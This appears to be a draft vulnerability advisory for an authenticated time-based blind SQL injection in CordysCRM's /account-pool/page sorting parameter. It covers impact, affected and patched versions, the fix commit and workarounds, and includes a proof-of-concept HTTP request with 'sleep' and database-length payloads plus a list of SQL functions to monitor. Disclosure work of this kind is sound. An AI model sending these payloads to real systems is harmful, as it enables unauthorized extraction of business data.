# CordysCRM customer pool sorting SQL injection advisory draft

## Summary

CordysCRM contains an authenticated SQL injection vulnerability in the customer pool pagination endpoint.

The affected endpoint is:

```http
POST /account-pool/page
```

The vulnerable parameter is:

```text
sort.name
```

When processing the sorting field, the backend used a user-controlled value in a dynamic SQL `ORDER BY` clause. An authenticated attacker with the `MODULE_SETTING:UPDATE` permission could inject SQL expressions through `sort.name` and perform time-based blind SQL injection.

## Impact

Successful exploitation may allow an attacker to:

- Confirm SQL injection through time-based delays.
- Enumerate database metadata, such as the current database name.
- Potentially extract sensitive business data through blind SQL injection.
- Cause database delays or service degradation by repeatedly triggering expensive SQL expressions.

Exploitation requires authentication and the `MODULE_SETTING:UPDATE` permission. Anonymous users or users without the required permission should not be able to reach the vulnerable code path.

## Affected versions

```text
< 1.7.0
```

## Patched versions

```text
1.7.0
```

## Severity

```text
High
```

Suggested CVSS 3.1 vector:

```text
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:L
```

## Weakness

```text
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
```

## Proof of concept

Send an authenticated request to the affected endpoint with a crafted `sort.name` value:

```http
POST /account-pool/page HTTP/1.1
Host: <target>
Content-Type: application/json;charset=UTF-8
X-AUTH-TOKEN: <token>
CSRF-TOKEN: <csrf-token>
Organization-Id: <organization-id>

{
  "current": 1,
  "pageSize": 30,
  "sort": {
    "name": "sleep(2)",
    "type": "asc"
  },
  "combineSearch": {
    "searchMode": "AND",
    "conditions": []
  },
  "filters": []
}
```

If the response time increases significantly compared with a normal request, the SQL expression has been executed.

Time-based blind extraction can also be verified with payloads such as:

```json
{
  "current": 1,
  "pageSize": 30,
  "sort": {
    "name": "if(length(database())=10,sleep(2),0)",
    "type": "asc"
  },
  "combineSearch": {
    "searchMode": "AND",
    "conditions": []
  },
  "filters": []
}
```

## Patches

The issue has been patched in the official source code by the following commit:

```text
b5b9272c016550d80a789fd8ffbf3d5a4c4bab52
```

Commit URL:

```text
https://github.com/1Panel-dev/CordysCRM/commit/b5b9272c016550d80a789fd8ffbf3d5a4c4bab52
```

The fix refactors SQL injection protection to use a centralized `SqlInjectionChecker` and blocks time-based SQL injection functions such as `sleep`, `benchmark`, `pg_sleep`, and `waitfor delay`.

Users should upgrade to `v1.7.0` or later.

## Workarounds

If upgrading immediately is not possible, administrators can reduce risk by:

- Restricting `MODULE_SETTING:UPDATE` permission to trusted administrators only.
- Adding strict server-side allowlists for `sort.name`.
- Allowing only known sortable fields such as `name`, `create_time`, and `update_time`.
- Ensuring `sort.type` only accepts `asc` or `desc`.
- Avoiding MyBatis `${}` interpolation for user-controlled sorting fields.
- Blocking suspicious `sort.name` values at a WAF or reverse proxy layer.
- Monitoring `/account-pool/page` requests containing SQL functions such as `sleep`, `benchmark`, `database`, `substr`, `ascii`, or `if`.

## References

- Fix commit: https://github.com/1Panel-dev/CordysCRM/commit/b5b9272c016550d80a789fd8ffbf3d5a4c4bab52
- Official repository: https://github.com/1Panel-dev/CordysCRM
- Official tags: https://github.com/1Panel-dev/CordysCRM/tags
- Official releases: https://github.com/1Panel-dev/CordysCRM/releases
- Docker Hub tags: https://hub.docker.com/r/1panel/cordys-crm/tags

## Reporter

Reported by: xiaoli-x-oss

